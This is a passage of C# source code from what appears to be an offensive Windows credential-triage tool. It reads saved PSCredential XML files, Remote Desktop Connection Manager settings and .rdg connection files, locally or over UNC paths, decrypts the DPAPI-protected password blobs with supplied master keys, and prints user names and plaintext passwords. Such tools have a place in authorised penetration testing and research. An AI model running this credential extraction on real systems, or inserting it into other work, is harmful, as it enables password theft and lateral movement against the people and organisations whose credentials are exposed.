                    $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings";
                TriageRDCManFile(MasterKeys, userRDManFile, unprotect);
            }
        }

        public static void TriagePSCredFile(Dictionary<string, string> MasterKeys, string credFile, bool unprotect = false)
        {
            // triage a saved PSCredential .xml
            //  example - `Get-Credential | Export-Clixml -Path C:\Temp\cred.xml`

            if (!File.Exists(credFile))
                throw new Exception($"PSCredential .xml); file '{credFile}' is not accessible or doesn't exist!\n");

            var lastAccessed = File.GetLastAccessTime(credFile);
            var lastModified = File.GetLastWriteTime(credFile);

            var xmlDoc = new XmlDocument();
            xmlDoc.Load(credFile);

            Console.WriteLine("    CredFile         : {0}", credFile);
            Console.WriteLine("    Accessed         : {0}", lastAccessed);
            Console.WriteLine("    Modified         : {0}", lastModified);

            var props = xmlDoc.GetElementsByTagName("Props");
            if (props.Count > 0)
            {
                var userName = props[0].ChildNodes[0].InnerText;
                var dpapiBlob = props[0].ChildNodes[1].InnerText;

                Console.WriteLine("    User Name        : {0}", userName);

                var blobBytes = Helpers.StringToByteArray(dpapiBlob);

                if (blobBytes.Length > 0)
                {
                    var decBytesRaw = Dpapi.DescribeDPAPIBlob(blobBytes, MasterKeys, "blob", unprotect);

                    if ((decBytesRaw != null) && (decBytesRaw.Length != 0))
                    {
                        var password = "";
                        var finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
                        if (finalIndex > 1)
                        {
                            var decBytes = new byte[finalIndex + 1];
                            Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
                            password = Encoding.Unicode.GetString(decBytes);
                        }
                        else
                        {
                            password = Encoding.ASCII.GetString(decBytesRaw);
                        }

                        Console.WriteLine("    Password         : {0}", password);
                    }
                }
            }

            Console.WriteLine();
        }

        public static void TriageRDCManFile(Dictionary<string, string> MasterKeys, string rdcManFile, bool unprotect = false)
        {
            // triage a specific RDCMan.settings file

            if (!File.Exists(rdcManFile))
                return;

            var lastAccessed = File.GetLastAccessTime(rdcManFile);
            var lastModified = File.GetLastWriteTime(rdcManFile);

            var xmlDoc = new XmlDocument();
            xmlDoc.Load(rdcManFile);

            Console.WriteLine("    RDCManFile    : {0}", rdcManFile);
            Console.WriteLine("    Accessed      : {0}", lastAccessed);
            Console.WriteLine("    Modified      : {0}", lastModified);


            // show any recently used servers
            var recentlyUsed = xmlDoc.GetElementsByTagName("recentlyUsed");
            if (recentlyUsed[0]["server"] != null)
            {
                var recentlyUsedServer = recentlyUsed[0]["server"].InnerText;
                Console.WriteLine("    Recent Server : {0}", recentlyUsedServer);
            }


            // see if there are any credential profiles
            var credProfileNodes = xmlDoc.GetElementsByTagName("credentialsProfile");

            if ((credProfileNodes != null) && (credProfileNodes.Count != 0))
            {
                Console.WriteLine("\r\n        Cred Profiles");
            }
            foreach (XmlNode credProfileNode in credProfileNodes)
            {
                Console.WriteLine();
                DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
            }


            // check default logonCredentials stuff
            var logonCredNodes = xmlDoc.GetElementsByTagName("logonCredentials");

            if ((logonCredNodes != null) && (logonCredNodes.Count != 0))
            {
                Console.WriteLine("\r\n        Default Logon Credentials");
            }
            foreach (XmlNode logonCredNode in logonCredNodes)
            {
                Console.WriteLine();
                DisplayCredProfile(MasterKeys, logonCredNode, unprotect);
            }


            // grab the recent RDG files
            var filesToOpen = xmlDoc.GetElementsByTagName("FilesToOpen");
            var items = filesToOpen[0].ChildNodes;

            // triage recently used RDG files                
            foreach (XmlNode rdgFile in items)
            {
                if (Interop.PathIsUNC(rdcManFile))
                {
                    // If the RDCMan.settings file is a \\UNC path (so /server:X was used),
                    //  check if the .RDG file is local or also a \\UNC path.
                    if (!Interop.PathIsUNC(rdgFile.InnerText))
                    {
                        // If the file .RDG file is local, try to translate it to the server \\UNC path
                        var computerName = rdcManFile.Split(new[] { '\\' }, StringSplitOptions.RemoveEmptyEntries)[0];
                        var rdgUncPath = Helpers.ConvertLocalPathToUNCPath(computerName, rdgFile.InnerText);
                        TriageRDGFile(MasterKeys, rdgUncPath, unprotect);
                    }
                    else
                    {
                        TriageRDGFile(MasterKeys, rdgFile.InnerText, unprotect);
                    }
                }
                else
                {
                    TriageRDGFile(MasterKeys, rdgFile.InnerText, unprotect);
                }
            }
            Console.WriteLine();
        }

        public static void DisplayCredProfile(Dictionary<string, string> MasterKeys, XmlNode credProfileNode, bool unprotect = false)
        {
            // helper that displays a Credential Profile/Logon settings XML node from RDG/RDCMan.settings files

            var profileName = credProfileNode["profileName"].InnerText;

            if (credProfileNode["userName"] == null)
            {
                // have a profile name only
                Console.WriteLine("          Cred Profile : {0}", profileName);
            }
            else
            {
                var userName = credProfileNode["userName"].InnerText.Trim();
                var domain = credProfileNode["domain"].InnerText.Trim();
                var b64Password = credProfileNode["password"].InnerText;
                var password = "";
                var fullUserName = "";

                if (String.IsNullOrEmpty(domain))
                {
                    fullUserName = userName;
                }
                else
                {
                    fullUserName = $"{domain}\\{userName}";
                }

                Console.WriteLine("          Profile Name : {0}", profileName);
                Console.WriteLine("            UserName   : {0}", fullUserName);

                var passwordDPAPIbytes = Convert.FromBase64String(b64Password);

                if (passwordDPAPIbytes.Length <= 0)
                    return;

                var decBytesRaw = Dpapi.DescribeDPAPIBlob(passwordDPAPIbytes, MasterKeys, "rdg", unprotect);

                if (decBytesRaw.Length != 0)
                {
                    // chop off anything after the UNICODE end
                    var finalIndex = Array.LastIndexOf(decBytesRaw, (byte)0);
                    if (finalIndex > 1)
                    {
                        var decBytes = new byte[finalIndex + 1];
                        Array.Copy(decBytesRaw, 0, decBytes, 0, finalIndex);
                        password = Encoding.Unicode.GetString(decBytes);
                    }
                    else
                    {
                        password = Encoding.ASCII.GetString(decBytesRaw);
                    }
                }
                Console.WriteLine("            Password   : {0}", password);
            }
        }

        public static void TriageRDGFile(Dictionary<string, string> MasterKeys, string rdgFilePath, bool unprotect = false)
        {
            // parses a RDG connection file, decrypting any password blobs as appropriate

            if (File.Exists(rdgFilePath))
            {
                Console.WriteLine("\r\n      {0}", rdgFilePath);

                var xmlDoc = new XmlDocument();
                xmlDoc.Load(rdgFilePath);

                var credProfileNodes = xmlDoc.GetElementsByTagName("credentialsProfile");

                if ((credProfileNodes != null) && (credProfileNodes.Count != 0))
                {
                    Console.WriteLine("\r\n        Cred Profiles");
                }
                foreach (XmlNode credProfileNode in credProfileNodes)
                {
                    Console.WriteLine();
                    DisplayCredProfile(MasterKeys, credProfileNode, unprotect);
                }

                var servers = xmlDoc.GetElementsByTagName("server");

                if ((servers != null) && (servers.Count != 0))
                {
                    Console.WriteLine("\r\n        Servers");
                }

                foreach (XmlNode server in servers)
                {
                    try
                    {
                        if ((server["properties"]["name"] != null))
                        {
                            if (server["properties"]["displayName"] != null)
                            {
                                Console.WriteLine("\r\n          Name         : {0} ({1})", server["properties"]["name"].InnerText, server["properties"]["displayName"].InnerText);
                            }
                            else
                            {
                                Console.WriteLine("\r\n          Name         : {0}", server["properties"]["name"].InnerText);
                            }

                            if (server["logonCredentials"] != null)
                            {
                                DisplayCredProfile(MasterKeys, server["logonCredentials"], unprotect);
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Exception: {0}", e);
                    }
                }
            }
            else
            {
                Console.WriteLine("\r\n      [X] .RDG file '{0}' is not accessible or doesn't exist!", rdgFilePath);
            }
        }

        public static void TriageRDGFolder(Dictionary<string, string> MasterKeys, string folder, bool unprotect)
        {
            // triage a specific RDG folder

            if (Directory.Exists(folder))
            {
                var systemFiles = Directory.GetFiles(folder);
                if ((systemFiles != null) && (systemFiles.Length != 0))
                {
                    Console.WriteLine("\r\nFolder       : {0}\r\n", folder);

                    foreach (var file in systemFiles)
                    {
                        if (file.EndsWith(".rdg"))
                        {
                            try
                            {
                                TriageRDGFile(MasterKeys, file, unprotect);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                            }
                        }
                    }
                }
                else
                {
                    // Console.WriteLine("\r\n[X] Folder '{0}' doesn't contain files!", folder);
                }
            }
            else
            {
                // Console.WriteLine("\r\n[X] Folder '{0}' doesn't currently exist!", folder);
            }
        }
    }
}